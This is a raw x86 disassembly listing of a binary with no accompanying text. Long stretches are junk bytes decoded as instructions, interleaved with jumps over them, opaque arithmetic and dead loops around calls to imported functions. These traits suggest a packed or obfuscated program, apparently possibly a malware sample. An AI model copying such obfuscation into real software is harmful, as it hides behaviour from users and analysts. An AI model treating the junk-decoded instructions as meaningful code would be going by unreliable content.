  404c61:	sbb    DWORD PTR [ebx-0x4f],edi
  404c64:	out    0xbc,eax
  404c66:	shl    BYTE PTR [ecx+ebp*1],1
  404c69:	add    edi,DWORD PTR [eax]
  404c6b:	inc    eax
  404c6c:	mov    DWORD PTR [ebp-0x14],edx
  404c6f:	mov    edx,DWORD PTR [ebp-0xc]
  404c72:	mov    edi,DWORD PTR [ebp-0x24]
  404c75:	jmp    0x404dda
  404c7a:	or     al,BYTE PTR [ecx-0x1aa2d1be]
  404c80:	push   0xffffffbd
  404c82:	cmp    eax,ecx
  404c84:	dec    esi
  404c85:	rol    esp,0x22
  404c88:	push   cs
  404c89:	xchg   dh,dl
  404c8b:	adc    eax,0x7f347c7c
  404c90:	jl     0x404d0e
  404c92:	sbb    eax,0x5459b984
  404c97:	cmc    
  404c98:	cld    
  404c99:	mov    WORD PTR [edx-0x48],gs
  404c9c:	fdivr  DWORD PTR [ebx]
  404c9e:	add    dh,ch
  404ca0:	push   ecx
  404ca1:	jbe    0x404d05
  404ca3:	(bad)  
  404ca4:	push   esi
  404ca5:	ror    cl,0x2b
  404ca8:	ja     0x404cbd
  404caa:	(bad)  
  404cac:	xrelease xacquire xchg DWORD PTR [ecx-0x4c],ebx
  404cb1:	push   cs
  404cb2:	lea    edi,[edx]
  404cb4:	ds sti 
  404cb6:	clc    
  404cb7:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  404cb9:	imul   ebp,DWORD PTR [ecx-0xc],0xffffffe4
  404cbd:	call   0xd2e292fc
  404cc2:	sbb    al,0xd2
  404cc4:	ret    0x3986
  404cc7:	mov    ch,0x59
  404cc9:	fwait
  404cca:	mov    ds:0xa70bf35f,al
  404ccf:	add    eax,0x6d64fb19
  404cd4:	push   0xffffffa9
  404cd6:	mov    bl,BYTE PTR [ecx]
  404cd8:	cmp    bh,BYTE PTR ds:0x74bd0a9d
  404cde:	dec    edi
  404cdf:	xor    ebp,ebx
  404ce1:	lods   al,BYTE PTR ds:[esi]
  404ce2:	stos   BYTE PTR es:[edi],al
  404ce3:	and    BYTE PTR [ebx+0x69],dh
  404ce6:	mov    ebx,0xd20e7ad2
  404ceb:	ss jno 0x404c93
  404cee:	mov    BYTE PTR [edi+ebp*2-0x638d37e8],0x15
  404cf6:	test   esp,0xe1798f93
  404cfc:	out    dx,al
  404cfd:	pop    ebx
  404cfe:	scas   eax,DWORD PTR es:[edi]
  404cff:	mov    dh,0xbf
  404d01:	cmp    edi,DWORD PTR [ecx]
  404d03:	cmp    DWORD PTR [edi-0x48],ebx
  404d06:	punpckldq mm1,DWORD PTR [ecx+0x51240209]
  404d0d:	(bad)  
  404d0e:	mov    esi,DWORD PTR [ebx]
  404d10:	xor    cl,bh
  404d12:	fstp   QWORD PTR [esi]
  404d14:	sub    eax,0x9ca0df0a
  404d19:	clc    
  404d1a:	(bad)  
  404d1b:	mov    ebx,ds
  404d1d:	xor    eax,0x174fec8b
  404d22:	sbb    eax,DWORD PTR [edi-0x7f865f1d]
  404d28:	adc    eax,0x93ff84f9
  404d2d:	mov    DWORD PTR [esi-0x6a],0x6bb39d5e
  404d34:	or     esp,DWORD PTR [edi-0x2cf2099a]
  404d3a:	fst    QWORD PTR [eax]
  404d3c:	xor    ebp,ecx
  404d3e:	sub    DWORD PTR [ebp+0x78c8effd],0xffffffd0
  404d45:	fwait
  404d46:	outs   dx,DWORD PTR ds:[esi]
  404d47:	sbb    bh,BYTE PTR es:[esi+0x57]
  404d4b:	mov    ds:0x8b22bb75,eax
  404d50:	push   DWORD PTR [ecx+0x142d8730]
  404d56:	inc    eax
  404d57:	cdq    
  404d58:	retf   0xb6d3
  404d5b:	cwde   
  404d5c:	dec    ecx
  404d5d:	add    BYTE PTR ds:0x61719bb8,ch
  404d63:	test   eax,0xe7025fef
  404d68:	sbb    al,0x55
  404d6a:	jmp    0xe2443888
  404d6f:	push   edi
  404d70:	pop    ebx
  404d71:	or     al,BYTE PTR [edx+0x2a9af961]
  404d77:	(bad)  
  404d78:	ror    DWORD PTR [ebp-0xb93ef1d],1
  404d7e:	shl    eax,1
  404d80:	aad    0xca
  404d82:	and    ecx,DWORD PTR [edx+0x5]
  404d85:	aad    0x99
  404d87:	mov    ds:0xe61e6e7a,al
  404d8c:	push   0xffffff89
  404d8e:	int    0xb9
  404d90:	xor    ebx,0xc95cd587
  404d96:	push   eax
  404d97:	sub    BYTE PTR [ebx],dl
  404d99:	ss jbe 0x404e0c
  404d9c:	xor    DWORD PTR [esi],eax
  404d9e:	inc    ecx
  404d9f:	adc    esi,ebx
  404da1:	enter  0x3251,0x65
  404da5:	rcl    BYTE PTR [ebp-0x41b058c9],0x96
  404dac:	lods   eax,DWORD PTR ds:[esi]
  404dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dae:	or     eax,0xa8aaa817
  404db3:	retf   0x1a81
  404db6:	sahf   
  404db7:	std    
  404db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404db9:	jmp    0xea0:0xbc8ff67a
  404dc0:	jo     0x404d6f
  404dc2:	je     0x404dae
  404dc4:	in     eax,dx
  404dc5:	jne    0x404d66
  404dc7:	pop    ebx
  404dc8:	push   edx
  404dc9:	sbb    BYTE PTR [esi+0x6d],cl
  404dcc:	fidivr DWORD PTR [ebp-0x6cf3ce6b]
  404dd2:	cmp    DWORD PTR [ebp+0x67],edi
  404dd5:	in     al,0xe1
  404dd7:	xlat   BYTE PTR ds:[ebx]
  404dd8:	or     ecx,DWORD PTR [ebp+0x33]
  404ddb:	rol    BYTE PTR [ebx],1
  404ddd:	ror    DWORD PTR [edi],1
  404ddf:	scas   eax,DWORD PTR es:[edi]
  404de0:	xlat   BYTE PTR ds:[ebx]
  404de1:	mov    edi,DWORD PTR [ebp-0xc]
  404de4:	xor    edi,eax
  404de6:	sub    edx,edi
  404de8:	mov    edi,DWORD PTR [ebp-0xc]
  404deb:	mov    ebx,DWORD PTR [ebp-0x14]
  404dee:	jmp    0x404f53
  404df3:	push   ebx
  404df4:	pop    ebx
  404df5:	inc    edx
  404df6:	cmp    DWORD PTR [edx-0x67],0x31957d53
  404dfd:	jb     0x404e2d
  404dff:	mov    edx,eax
  404e01:	sub    ebp,esi
  404e03:	scas   al,BYTE PTR es:[edi]
  404e04:	adc    al,0x7c
  404e06:	jl     0x404e3c
  404e08:	jg     0x404e86
  404e0a:	jl     0x404da6
  404e0c:	repz rol BYTE PTR [eax],cl
  404e0f:	inc    esp
  404e10:	xor    DWORD PTR [ecx],eax
  404e12:	push   ds
  404e13:	mov    DWORD PTR [esi+0x6b],ecx
  404e16:	lds    esi,FWORD PTR [ecx+eiz*8+0x33]
  404e1a:	xchg   ebp,eax
  404e1b:	cwde   
  404e1c:	cmp    BYTE PTR [eax-0x3c],0xf7
  404e20:	mov    al,ds:0x66948116
  404e25:	jmp    0xb244:0x619975f8
  404e2c:	loope  0x404e8f
  404e2e:	ja     0x404de5
  404e30:	imul   edi,DWORD PTR [ebx],0xffffff90
  404e33:	add    BYTE PTR [eax+0x35fa84cc],ah
  404e39:	mov    ch,ah
  404e3b:	cmp    al,0x40
  404e3d:	icebp  
  404e3e:	cmp    eax,0x7922a375
  404e43:	fcmove st,st(4)
  404e45:	cmp    al,0x1b
  404e47:	jbe    0x404e54
  404e49:	push   0x18
  404e4b:	pop    ebp
  404e4c:	push   edx
  404e4d:	push   ebp
  404e4e:	shl    BYTE PTR [ecx],cl
  404e50:	ja     0x404dd2
  404e52:	lods   al,BYTE PTR ds:[esi]
  404e53:	loop   0x404e62
  404e55:	or     BYTE PTR [eax],0x7c
  404e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e59:	cli    
  404e5a:	push   0x7e
  404e5c:	je     0x404e62
  404e5e:	and    DWORD PTR [eax],edx
  404e60:	retf   
  404e61:	mov    esi,0x46b62214
  404e66:	adc    esp,DWORD PTR [esp+ebx*4]
  404e69:	fstp   TBYTE PTR [edi]
  404e6b:	adc    al,0x24
  404e6d:	cmp    DWORD PTR [edi+0x2b],eax
  404e70:	or     esi,eax
  404e72:	pop    ebx
  404e73:	pop    ebp
  404e74:	lahf   
  404e75:	dec    ecx
  404e76:	push   esp
  404e77:	pop    edx
  404e78:	lods   al,BYTE PTR ds:[esi]
  404e79:	xchg   esp,eax
  404e7a:	(bad)  
  404e7b:	and    eax,0x34cadd05
  404e80:	mov    ah,BYTE PTR [ecx+eiz*2-0x728ce9b0]
  404e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e88:	cmp    al,0x22
  404e8a:	mov    BYTE PTR [esi+ecx*4+0x7b],ch
  404e8e:	lock sbb ch,bl
  404e91:	out    0x37,eax
  404e93:	stos   BYTE PTR es:[edi],al
  404e94:	les    eax,FWORD PTR [ebx-0x49fb0a00]
  404e9a:	nop
  404e9b:	pop    edi
  404e9c:	sub    ebx,ecx
  404e9e:	(bad)  
  404e9f:	fcomp  st(5)
  404ea1:	ins    DWORD PTR es:[edi],dx
  404ea2:	jb     0x404ecf
  404ea4:	test   eax,0x7561df76
  404ea9:	add    ah,BYTE PTR [ebx-0x4c]
  404eac:	sub    edx,esp
  404eae:	mov    ?,WORD PTR ds:0x74049ef6
  404eb4:	xor    al,0x6e
  404eb6:	cli    
  404eb7:	add    eax,0xb87f6757
  404ebc:	mov    eax,0xfeb03cb0
  404ec1:	xchg   edx,eax
  404ec2:	mov    eax,0xaff9edf0
  404ec7:	data16 jns 0x404f0b
  404eca:	sub    DWORD PTR [ecx-0x2d935dde],ebx
  404ed0:	inc    ebx
  404ed1:	mov    dl,BYTE PTR [ebx-0x15465f36]
  404ed7:	xchg   BYTE PTR [ecx+0x212e6f20],al
  404edd:	pop    esi
  404ede:	scas   al,BYTE PTR es:[edi]
  404edf:	push   eax
  404ee0:	adc    eax,0xa3d1a98b
  404ee5:	(bad)  
  404ee6:	bound  eax,QWORD PTR [edi]
  404ee8:	enter  0x3bac,0x77
  404eec:	out    dx,eax
  404eed:	cli    
  404eee:	scas   al,BYTE PTR es:[edi]
  404eef:	mov    DWORD PTR [ecx],edi
  404ef1:	fiadd  DWORD PTR [ecx-0x6]
  404ef4:	jno    0x404e85
  404ef6:	jns    0x404ef6
  404ef8:	push   es
  404ef9:	mul    BYTE PTR [esi]
  404efb:	cmp    al,0x6c
  404efd:	aam    0x4e
  404eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f00:	jl     0x404f44
  404f02:	add    al,0xa4
  404f04:	inc    ebx
  404f05:	jmp    0x404f57
  404f07:	aas    
  404f08:	test   eax,0x3df70168
  404f0d:	ror    ebx,1
  404f0f:	int    0x65
  404f11:	and    BYTE PTR [ebx+ecx*4-0x6c],ah
  404f15:	ins    DWORD PTR es:[edi],dx
  404f16:	dec    ebx
  404f17:	ins    BYTE PTR es:[edi],dx
  404f18:	xor    BYTE PTR ss:[edi+0x19],dh
  404f1c:	rcr    DWORD PTR [esi+0x57ac880a],cl
  404f22:	bound  ecx,QWORD PTR [edi]
  404f24:	je     0x404f58
  404f26:	dec    ebx
  404f27:	sti    
  404f28:	rcr    DWORD PTR ds:0x68e58e40,cl
  404f2e:	sbb    BYTE PTR [ebp+0x12aa8e5],dl
  404f34:	sti    
  404f35:	bound  edi,QWORD PTR [esi]
  404f37:	xchg   ebp,eax
  404f38:	(bad)  
  404f39:	loop   0x404f55
  404f3b:	pushf  
  404f3c:	or     al,0x7
  404f3e:	(bad)  
  404f3f:	jnp    0x404eea
  404f41:	jmp    0x404f3c
  404f43:	push   es
  404f44:	(bad)  
  404f47:	mov    al,0xc7
  404f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f4a:	out    0xc8,eax
  404f4c:	mov    bl,ch
  404f4e:	das    
  404f4f:	or     BYTE PTR [eax],bl
  404f51:	adc    BYTE PTR [ebx-0x6fc07cd],bh
  404f57:	imul   edi,ebx
  404f5a:	mov    ebx,DWORD PTR [ebp-0x18]
  404f5d:	xor    ebx,eax
  404f5f:	sub    edx,ecx
  404f61:	lea    edi,[edi+ebx*1+0x32729e]
  404f68:	cmp    edi,edx
  404f6a:	jbe    0x4047d5
  404f70:	mov    edx,DWORD PTR [ebp-0xc]
  404f73:	mov    edi,DWORD PTR [ebp-0x24]
  404f76:	xor    edx,eax
  404f78:	add    edx,ecx
  404f7a:	imul   edx,edi
  404f7d:	mov    edi,DWORD PTR [ebp-0x18]
  404f80:	xor    edi,eax
  404f82:	add    edx,edi
  404f84:	mov    edi,DWORD PTR [ebp-0x8]
  404f87:	lea    edx,[edx+edi*1+0x32729e]
  404f8e:	mov    DWORD PTR [ebp-0x8],edx
  404f91:	jmp    0x4050f6
  404f96:	jecxz  0x404f49
  404f98:	out    0xe3,eax
  404f9a:	jge    0x405019
  404f9c:	sti    
  404f9d:	mov    cl,0x66
  404f9f:	pop    edx
  404fa0:	cmp    BYTE PTR ds:0x7a09a661,cl
  404fa6:	popw   ss
  404fa8:	jl     0x405026
  404faa:	xor    al,0x7f
  404fac:	jl     0x40502a
  404fae:	xor    eax,0x2cc1ebc8
  404fb3:	inc    ecx
  404fb4:	jecxz  0x405027
  404fb6:	push   ebx
  404fb7:	dec    ecx
  404fb8:	xchg   DWORD PTR [edi+0xf],esp
  404fbb:	icebp  
  404fbc:	adc    eax,0x4326f321
  404fc1:	dec    al
  404fc3:	mov    eax,0xbf991bb5
  404fc8:	inc    esp
  404fc9:	cli    
  404fca:	xchg   edx,eax
  404fcb:	out    0x34,eax
  404fcd:	sub    al,BYTE PTR [edx-0x63]
  404fd0:	pop    ebx
  404fd1:	ret    
  404fd2:	popa   
  404fd3:	into   
  404fd4:	scas   eax,DWORD PTR es:[edi]
  404fd5:	or     eax,0xbf19dbe1
  404fda:	popf   
  404fdb:	fist   WORD PTR [edx+esi*2+0x681d5fe9]
  404fe2:	test   BYTE PTR [edi+edi*1],bh
  404fe5:	pop    ss
  404fe6:	fstp   DWORD PTR [ebx+0xb]
  404fe9:	(bad)  [ecx]
  404feb:	push   eax
  404fec:	pop    eax
  404fed:	cs mov ebp,0xb0bed76d
  404ff3:	dec    esi
  404ff4:	push   edi
  404ff5:	sahf   
  404ff6:	sub    eax,DWORD PTR [ebp+0x192ae099]
  404ffc:	xor    eax,0xedf19f72
  405001:	jo     0x404f89
  405003:	into   
  405004:	lahf   
  405005:	mov    esi,0x41f26bd6
  40500a:	xlat   BYTE PTR ds:[ebx]
  40500b:	lea    ebx,[ebx-0x2198dc88]
  405011:	add    al,0xc1
  405013:	sahf   
  405014:	sub    bl,BYTE PTR [ebx+ecx*4]
  405017:	divps  xmm0,XMMWORD PTR [edi-0x7b9584d1]
  40501e:	and    eax,0x2a798641
  405023:	out    0x90,al
  405025:	cmc    
  405026:	gs call 0xacb7:0x136a1645
  40502e:	(bad)  
  40502f:	in     al,dx
  405030:	dec    ecx
  405031:	outs   dx,DWORD PTR ds:[esi]
  405032:	mov    eax,0x837773ca
  405037:	pop    ss
  405038:	adc    BYTE PTR [edx+0x75],al
  40503b:	dec    edi
  40503c:	pop    eax
  40503d:	pushf  
  40503e:	test   al,0xde
  405040:	dec    ebx
  405041:	(bad)  
  405042:	leave  
  405043:	aam    0x9
  405045:	sar    esp,1
  405047:	pop    ds
  405048:	pop    ebx
  405049:	lahf   
  40504a:	test   eax,0xccd66cbd
  40504f:	mov    al,ds:0x9b7d2a18
  405054:	jae    0x40508c
  405056:	sub    ecx,ebx
  405058:	or     ch,ah
  40505a:	shld   DWORD PTR fs:[eax+0x4547075d],ebx,0x37
  405063:	sbb    BYTE PTR [ebp-0x5a1e68ef],cl
  405069:	mov    cl,0x2c
  40506b:	in     eax,dx
  40506c:	mov    esp,0x55abb9e7
  405071:	jbe    0x4050e9
  405073:	arpl   WORD PTR [eax],dx
  405075:	das    
  405076:	out    0xbf,al
  405078:	vmulsd xmm0,xmm1,xmm7
  40507c:	cld    
  40507d:	and    DWORD PTR [esi],ecx
  40507f:	fistp  QWORD PTR [ebx-0x2f]
  405082:	rcr    ecx,1
  405084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405085:	arpl   WORD PTR [edx],bx
  405087:	inc    esi
  405088:	or     al,bh
  40508a:	stc    
  40508b:	arpl   WORD PTR [ecx],si
  40508d:	or     al,0x88
  40508f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405090:	jp     0x40510e
  405092:	adc    DWORD PTR ds:0xc4d6ea01,ebx
  405098:	test   al,0xdd
  40509a:	call   0x4484:0x9a618ee2
  4050a1:	(bad)  
  4050a3:	enter  0x62bd,0x6a
  4050a7:	push   es
  4050a8:	retf   0x5467
  4050ab:	pop    ss
  4050ac:	and    edx,DWORD PTR [eax+0x6d]
  4050af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050b0:	mov    ss,ecx
  4050b2:	popa   
  4050b3:	in     al,0xba
  4050b5:	push   edi
  4050b6:	mov    esp,0x5fa33c6f
  4050bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050bc:	dec    eax
  4050bd:	jne    0x40507c
  4050bf:	imul   DWORD PTR [edi]
  4050c1:	push   0x1e
  4050c3:	cmp    DWORD PTR [edi+0x54],ebp
  4050c6:	ins    DWORD PTR es:[edi],dx
  4050c7:	dec    ebx
  4050c8:	pop    ebp
  4050c9:	jecxz  0x4050f2
  4050cb:	bound  ebp,QWORD PTR [ebx+0xe]
  4050ce:	test   al,0x56
  4050d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050d1:	mov    ebx,DWORD PTR [ecx]
  4050d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050d4:	jle    0x405152
  4050d6:	cmp    bh,BYTE PTR [ecx]
  4050d8:	pop    ebp
  4050d9:	lds    esi,FWORD PTR [esi]
  4050db:	hlt    
  4050dc:	mov    dh,0x49
  4050de:	jle    0x4050d4
  4050e0:	or     BYTE PTR [edx+ebp*1+0x47],bh
  4050e4:	mov    ch,0x3e
  4050e6:	(bad)  
  4050e7:	xor    bl,bh
  4050e9:	je     0x40506f
  4050eb:	jp     0x40508a
  4050ed:	popa   
  4050ee:	mov    bh,0xcb
  4050f0:	adc    ah,al
  4050f2:	icebp  
  4050f3:	mov    DWORD PTR [ecx],edi
  4050f5:	push   cs
  4050f6:	mov    edx,DWORD PTR [ebp-0x20]
  4050f9:	xor    edx,eax
  4050fb:	mov    edi,0xffcd8d62
  405100:	sub    edi,edx
  405102:	add    edi,DWORD PTR [ebp-0x10]
  405105:	mov    edx,DWORD PTR [ebp-0x20]
  405108:	mov    ebx,DWORD PTR [ebp-0x8]
  40510b:	xor    edx,eax
  40510d:	add    edx,ecx
  40510f:	imul   edx,ebx
  405112:	cmp    edx,edi
  405114:	jbe    0x4038c9
  40511a:	pop    ebx
  40511b:	pop    edi
  40511c:	leave  
  40511d:	ret    0x8
  405120:	push   ebp
  405121:	mov    ebp,esp
  405123:	push   ecx
  405124:	adc    DWORD PTR ds:0x41074f,ebx
  40512a:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  405131:	and    DWORD PTR ds:0x4489a0,0x0
  40513b:	jmp    0x40514d
  405140:	mov    edx,DWORD PTR ds:0x4489a0
  405146:	inc    edx
  405147:	mov    DWORD PTR ds:0x4489a0,edx
  40514d:	cmp    DWORD PTR ds:0x4489a0,0x10
  405154:	jae    0x40518d
  40515a:	cmp    DWORD PTR ds:0x4489a0,0x18
  405161:	jne    0x40517b
  405167:	push   DWORD PTR [ebp-0x10]
  40516a:	push   DWORD PTR [ebp-0x14]
  40516d:	push   0x410939
  405172:	push   DWORD PTR [ebp-0x10]
  405175:	call   DWORD PTR ds:0x443010
  40517b:	jmp    0x405140
  405180:	movzx  edx,BYTE PTR ds:0x44b6e4
  405187:	adc    DWORD PTR ds:0x4247be,edx
  40518d:	mov    eax,DWORD PTR [ebp-0x4]
  405190:	adc    edx,ecx
  405192:	jmp    0x4052a5
  405197:	shr    DWORD PTR [ebp+0x4e7dfe7d],cl
  40519d:	sti    
  40519e:	ins    DWORD PTR es:[edi],dx
  40519f:	fs jne 0x40519a
  4051a2:	push   edi
  4051a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a5:	dec    ebp
  4051a6:	sub    DWORD PTR [esi],edi
  4051a8:	sub    DWORD PTR [esp+edi*2+0x62],edi
  4051ac:	jl     0x40522a
  4051ae:	jl     0x405170
  4051b0:	cmc    
  4051b1:	mov    ds:0xa07d899b,al
  4051b6:	mov    al,ds:0xea27eefb
  4051bb:	sub    al,BYTE PTR [ebx]
  4051bd:	cmp    bh,0x9f
  4051c0:	test   al,0x57
  4051c2:	push   esp
  4051c3:	mov    ds:0x7b782a60,eax
  4051c8:	enter  0x5ed3,0xf3
  4051cc:	fdiv   st(6),st
  4051ce:	(bad)  
  4051d0:	addr16 xor esp,0x7f
  4051d4:	pushf  
  4051d5:	cs cs das 
  4051d8:	repz add bh,ch
  4051db:	xchg   ebp,eax
  4051dc:	lock add ecx,ebp
  4051df:	psllq  mm0,mm0
  4051e2:	mov    ebp,0x323af980
  4051e7:	mov    cl,0x61
  4051e9:	sbb    ecx,ebx
  4051eb:	mov    al,0x2a
  4051ed:	or     bl,cl
  4051ef:	ror    BYTE PTR [eax],cl
  4051f1:	out    0xd7,al
  4051f3:	(bad)  
  4051f4:	dec    ebx
  4051f5:	into   
  4051f6:	mov    al,ds:0xe7d65fa4
  4051fb:	mov    cl,0xb2
  4051fd:	out    dx,eax
  4051fe:	jno    0x4051ac
  405200:	dec    ebp
  405201:	xchg   BYTE PTR [eax+0x3a],bh
  405204:	ss cli 
  405206:	fsub   QWORD PTR [eax-0x53f817ae]
  40520c:	cwde   
  40520d:	call   0x9c8f:0xa1355289
  405214:	mov    bh,0x1d
  405216:	xor    DWORD PTR [edi],ebx
  405218:	push   cs
  405219:	fstp   DWORD PTR [edi+0x50]
  40521c:	shrd   edx,edi,cl
  40521f:	or     ebx,ecx
  405221:	or     BYTE PTR [edx+0x59824638],dl
  405227:	or     eax,0xf64a84a7
  40522c:	jmp    0xf565:0x713b5a4b
  405233:	inc    edi
  405234:	ret    
  405235:	out    dx,eax
  405236:	push   edi
  405237:	xor    ch,BYTE PTR [eax+0x1b8bae3]
  40523d:	fimul  DWORD PTR [ebx-0xfb6b4d3]
  405243:	stos   DWORD PTR es:[edi],eax
  405244:	or     DWORD PTR [esp+ecx*4],esi
  405247:	sub    DWORD PTR [esi+0x2b],0x43a60122
  40524e:	std    
  40524f:	pop    ds
  405250:	push   esp
  405251:	xor    al,0x4
  405253:	fsub   QWORD PTR [esi-0x2f]
  405256:	push   0x84af0a14
  40525b:	sahf   
  40525c:	and    bl,bh
  40525e:	pushf  
  40525f:	gs int3 
  405261:	ret    
  405262:	aam    0xe5
  405264:	shl    DWORD PTR [ebp-0x48],cl
  405267:	mov    BYTE PTR [esi],bl
  405269:	leave  
  40526a:	sar    BYTE PTR [ebx+0x57b6cd3a],1
  405270:	popf   
  405271:	int    0xab
  405273:	aas    
  405274:	addr16 aad 0x8a
  405277:	fidiv  WORD PTR [edx+0x45593078]
  40527d:	xchg   DWORD PTR [ebp+0x47],esp
  405280:	sub    BYTE PTR [ebx+0x73],0x96
  405284:	mov    dh,0x44
  405286:	stos   DWORD PTR es:[edi],eax
  405287:	adc    eax,DWORD PTR [ecx-0x6d]
  40528a:	cmp    DWORD PTR [eax],ecx
  40528c:	inc    edi
  40528d:	out    dx,al
  40528e:	fisttp DWORD PTR [edx]
  405290:	lahf   
  405291:	test   eax,0xa5a41271
  405296:	mov    DWORD PTR [ebx-0x62],edi
  405299:	pop    esp
  40529a:	cwde   
  40529b:	xor    ch,BYTE PTR [eax+0x7349964e]
  4052a1:	shr    BYTE PTR [ecx+0x9],1
  4052a4:	das    
  4052a5:	mov    edx,DWORD PTR [ebp+0x10]
  4052a8:	jmp    0x4053bb
  4052ad:	shl    ecx,0xe4
  4052b0:	xchg   edi,eax
  4052b1:	fs jns 0x4052f5
  4052b4:	jns    0x4052eb
  4052b6:	adc    al,0x56
  4052b8:	jne    0x405276
  4052ba:	in     eax,0xf8
  4052bc:	int    0x24
  4052be:	sub    BYTE PTR [esp+edi*2+0x62],bh
  4052c2:	jl     0x405340
  4052c4:	jl     0x4052e9
  4052c6:	test   BYTE PTR ds:0x160b7c8b,ah
  4052cc:	cmc    
  4052cd:	in     eax,0xb6
  4052cf:	xor    DWORD PTR [ecx+ecx*1+0x65],eax
  4052d3:	mov    bh,0x97
  4052d5:	pop    esp
  4052d6:	shl    DWORD PTR [edx],1
  4052d8:	mov    eax,0xf21421f6
  4052dd:	popaw  
  4052df:	xor    al,0x23
  4052e1:	sbb    al,0xca
  4052e3:	mov    bh,0xd3
  4052e5:	or     DWORD PTR ds:0x9a768f0c,esp
  4052eb:	inc    eax
  4052ec:	sbb    cl,BYTE PTR [ebx-0x5d8e8cae]
  4052f2:	ret    0x456c
  4052f5:	mov    gs,WORD PTR [edi+0x4fae3322]
  4052fb:	aam    0xe2
  4052fd:	pop    esi
  4052fe:	mov    eax,0x4a811bca
  405303:	xchg   ebx,eax
  405304:	xor    eax,0x1271da80
  405309:	sbb    esi,DWORD PTR [eax]
  40530b:	nop
  40530c:	aas    
  40530d:	test   BYTE PTR [eax-0x75],dl
  405310:	and    al,0x7c
  405312:	ret    0x20f3
  405315:	pop    esi
  405316:	not    DWORD PTR gs:[esi-0x4da0e19f]
  40531d:	and    al,BYTE PTR [ebp-0x67]
  405320:	test   eax,0x6fea7b70
  405325:	push   edx
  405326:	loop   0x4052f1
  405328:	jmp    0x61d96c6f
  40532d:	mov    edi,0x6ca10591
  405332:	jnp    0x40536c
  405334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405335:	dec    ebp
  405336:	mov    al,0xdc
  405338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405339:	rcl    BYTE PTR [eax],1
  40533b:	in     al,0x72
  40533d:	mov    eax,ds:0x34dbdb30
  405342:	cmp    al,0xc7
  405344:	sub    DWORD PTR [ebx+ebp*1+0x9a0fcaf],edi
  40534b:	mov    al,0x5c
  40534d:	push   edx
  40534e:	imul   ebx,DWORD PTR [ecx-0x999dbb4],0xffffff86
  405355:	mov    ?,WORD PTR [ebx+edi*8-0x28]
  405359:	call   0x89b4ecdc
  40535e:	std    
  40535f:	scas   eax,DWORD PTR es:[edi]
  405360:	jo     0x405378
  405362:	mov    BYTE PTR [ecx+0x3d6d8d18],al
  405368:	sub    ch,BYTE PTR [ebx-0x2a]
  40536b:	sahf   
  40536c:	sub    al,0x81
  40536e:	add    eax,0x2c082747
  405373:	mov    ebx,0x9fd456a8
  405378:	dec    esp
  405379:	jg     0x405327
  40537b:	imul   esi,DWORD PTR [ebx+0x12],0x537da218
  405382:	mov    bh,0x40
  405384:	and    al,0x91
  405386:	sbb    bh,bh
  405388:	push   0x50
  40538a:	std    
  40538b:	fsubr  QWORD PTR [ebx]
  40538d:	mov    bh,0xab
  40538f:	fbstp  TBYTE PTR [edx]
  405391:	jns    0x4053ca
  405393:	mov    eax,ds:0x83e099d0
  405398:	enter  0x6234,0x33
  40539c:	dec    ecx
  40539d:	shl    BYTE PTR [ebp-0x543b2f31],1
  4053a3:	mov    ah,0x1
  4053a5:	add    edx,edx
  4053a7:	(bad)  
  4053a8:	int    0x6e
  4053aa:	dec    ebx
  4053ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053ac:	not    DWORD PTR [esi]
  4053ae:	scas   al,BYTE PTR es:[edi]
  4053af:	jge    0x40536c
  4053b1:	test   al,0xdb
  4053b3:	loopne 0x4053ea
  4053b5:	mov    ch,0xd7
  4053b7:	jl     0x405354
  4053b9:	push   es
  4053ba:	sar    BYTE PTR [ecx+0x7510857],1
  4053c0:	xor    DWORD PTR ds:0x4247c6,0x5c99
  4053ca:	xor    eax,ecx
  4053cc:	add    eax,0x32729e
  4053d1:	sub    DWORD PTR ds:0x4247d2,0x41074b
  4053db:	mov    DWORD PTR [edx],eax
  4053dd:	mov    eax,DWORD PTR [ebp+0xc]
  4053e0:	xor    eax,ecx
  4053e2:	push   esi
  4053e3:	add    DWORD PTR ds:0x44b6e4,0x2efc
  4053ed:	mov    esi,DWORD PTR [ebp+0x10]
  4053f0:	mov    edx,0x32729e
  4053f5:	sub    DWORD PTR ds:0x44e428,0x7c97
  4053ff:	add    eax,edx
  405401:	xor    DWORD PTR ds:0x44e428,0x44b6dc
  40540b:	mov    DWORD PTR [esi+0x4],eax
  40540e:	mov    DWORD PTR ds:0x44e424,0x1d
  405418:	cmp    DWORD PTR ds:0x44e424,0x0
  40541f:	je     0x405452
  405425:	cmp    DWORD PTR ds:0x44e424,0x21
  40542c:	jne    0x405442
  405432:	push   0x4107d0
  405437:	push   0x400000
  40543c:	call   DWORD PTR ds:0x4430dc
  405442:	mov    eax,ds:0x44e424
  405447:	dec    eax
  405448:	mov    ds:0x44e424,eax
  40544d:	jmp    0x405418
  405452:	mov    eax,DWORD PTR [ebp+0x14]
  405455:	mov    esi,DWORD PTR [ebp+0x10]
  405458:	mov    DWORD PTR [esi+0x8],eax
  40545b:	mov    eax,DWORD PTR [ebp+0x18]
  40545e:	mov    esi,DWORD PTR [ebp+0x10]
  405461:	mov    DWORD PTR [esi+0xc],eax
  405464:	mov    eax,DWORD PTR [ebp+0x1c]
  405467:	mov    esi,DWORD PTR [ebp+0x10]
  40546a:	mov    DWORD PTR [esi+0x10],eax
  40546d:	mov    eax,eax
  40546f:	mov    eax,DWORD PTR [ebp+0x8]
  405472:	xor    eax,ecx
